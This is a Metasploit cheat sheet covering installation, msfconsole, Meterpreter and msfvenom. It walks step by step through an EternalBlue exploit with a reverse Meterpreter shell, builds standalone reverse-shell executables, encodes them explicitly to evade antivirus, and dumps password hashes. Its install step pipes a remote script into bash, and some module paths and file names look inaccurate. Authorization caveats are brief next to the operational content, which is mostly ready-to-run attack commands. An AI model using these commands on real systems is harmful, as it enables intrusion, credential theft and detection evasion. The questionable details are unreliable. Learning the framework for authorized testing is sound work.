#metasploit

# Metasploit Overview

## What is Metasploit?

Metasploit is the world's most used penetration testing platform. It's an open-source framework that simplifies exploit development, deployment, and vulnerability testing.

It is commonly used by:

- Penetration testers
- Security researchers
- Red teamers
- Vulnerability assessors
- System administrators

Metasploit can:

- Develop and execute exploits
- Test for vulnerabilities
- Generate payloads
- Perform post-exploitation activities
- Scan networks and services
- Generate reports and documentation

---

## Key Features

- **Comprehensive**: Thousands of exploits and modules
- **Modular**: Easy to develop custom modules
- **Flexible**: Multiple payload options and delivery methods
- **Powerful**: Full post-exploitation capabilities
- **User-Friendly**: Command-line interface (msfconsole) with extensive help

---

# Installing Metasploit on Linux

## Ubuntu / Debian

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wss.erb > /tmp/metasploit-framework-wss.erb
sudo bash -c 'bash <(curl -sL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wss.erb)'
```

Or via apt (if available):

```bash
sudo apt update
sudo apt install metasploit-framework -y
```

## Fedora

```bash
sudo dnf install metasploit-framework
```

## Docker (Recommended for Isolation)

```bash
docker pull metasploitframework/metasploit-framework:latest
docker run -it metasploitframework/metasploit-framework:latest
```

---

## Verify Installation

```bash
msfconsole --version
```

---

# Basic Terminology

| Term | Meaning |
|---|---|
| Exploit | Code that takes advantage of a vulnerability |
| Payload | Code executed after successful exploitation |
| Module | Reusable component (exploit, payload, encoder, etc.) |
| Listener | Service waiting for reverse connections |
| Session | Active connection to compromised system |
| Post-Exploitation | Activities after gaining initial access |
| Encoder | Tool to bypass security controls |
| Handler | Manages sessions and interactions |

---

# Metasploit Module Types

| Module Type | Purpose | Example |
|---|---|---|
| Exploit | Triggers vulnerability | `exploit/windows/smb/ms17_010` |
| Payload | Code to execute | `payload/windows/meterpreter/reverse_tcp` |
| Encoder | Obfuscate payload | `encoder/x86/shikata_ga_nai` |
| Auxiliary | Scanners and utilities | `auxiliary/scanner/nmap/nmap` |
| Post | Post-exploitation | `post/windows/gather/hashdump` |

---

# Basic Usage

## Start Metasploit Console

```bash
msfconsole
```

---

## Search for Exploits

```
msf > search windows smb
```

---

## Select an Exploit

```
msf > use exploit/windows/smb/ms17_010_eternalblue
```

---

## Show Exploit Options

```
msf exploit(ms17_010_eternalblue) > show options
```

---

## Set Required Options

```
msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf exploit(ms17_010_eternalblue) > set LPORT 4444
```

---

## Execute Exploit

```
msf exploit(ms17_010_eternalblue) > exploit
```

---

# Common Metasploit Modules

| Module | Purpose | Command |
|---|---|---|
| Port Scanner | Identify open ports | `auxiliary/scanner/nmap/nmap` |
| Service Enumeration | Detect services | `auxiliary/scanner/smb/smb_enumeration` |
| SMB Exploit | EternalBlue | `exploit/windows/smb/ms17_010_eternalblue` |
| SSH Brute Force | SSH login testing | `auxiliary/scanner/ssh/ssh_login` |
| Web Vulnerability Scanner | Scan web apps | `auxiliary/scanner/http/dir_scanner` |
| Meterpreter Payload | Reverse shell | `payload/windows/meterpreter/reverse_tcp` |
| Post-Exploitation | Dump hashes | `post/windows/gather/hashdump` |

---

# Meterpreter Basics

Meterpreter is an advanced payload that provides a command shell in the compromised system.

## Common Meterpreter Commands

```
meterpreter > help                    # Show help
meterpreter > sysinfo                 # System information
meterpreter > getuid                  # Current user
meterpreter > ipconfig                # Network configuration
meterpreter > ps                      # List processes
meterpreter > migrate PID             # Move to another process
meterpreter > hashdump                # Extract password hashes
meterpreter > screenshot              # Take screenshot
meterpreter > shell                   # Drop to system shell
meterpreter > upload localfile.txt    # Upload file
meterpreter > download remotefile.txt # Download file
```

---

# Common Attack Workflows

## Windows SMB EternalBlue Exploitation

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf exploit(ms17_010_eternalblue) > exploit
```

---

## Create Standalone Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
```

---

## Setup Handler for Reverse Connection

```
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.50
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit
```

---

# MSFVenom (Payload Generator)

Generate standalone payloads without Metasploit console:

## Generate Windows Executable Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
```

## Generate Linux Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload
```

## Encode Payload (Avoid Detection)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
```

## Multiple Encodings

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```

---

# Common Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `-p` | Payload to use | `-p windows/meterpreter/reverse_tcp` |
| `-f` | Output format | `-f exe`, `-f elf`, `-f aspx` |
| `-o` | Output file | `-o payload.exe` |
| `-e` | Encoder | `-e x86/shikata_ga_nai` |
| `-i` | Iterations | `-i 5` |
| `LHOST` | Listening host | `LHOST=192.168.1.50` |
| `LPORT` | Listening port | `LPORT=4444` |
| `RHOSTS` | Remote hosts | `RHOSTS=192.168.1.100` |

---

# Tips and Best Practices

- ✅ Always get written authorization before testing
- ✅ Use within authorized network testing scope
- ✅ Create backdoors only in authorized environments
- ✅ Document all findings and actions
- ✅ Use sessions carefully to avoid detection
- ✅ Clean up artifacts after testing
- ✅ Use encoding to avoid signature detection
- ✅ Test payloads in lab environment first
- ❌ Don't use Metasploit without authorization
- ❌ Don't leave backdoors in production
- ❌ Don't perform unauthorized system access
- ❌ Don't exceed agreed scope of testing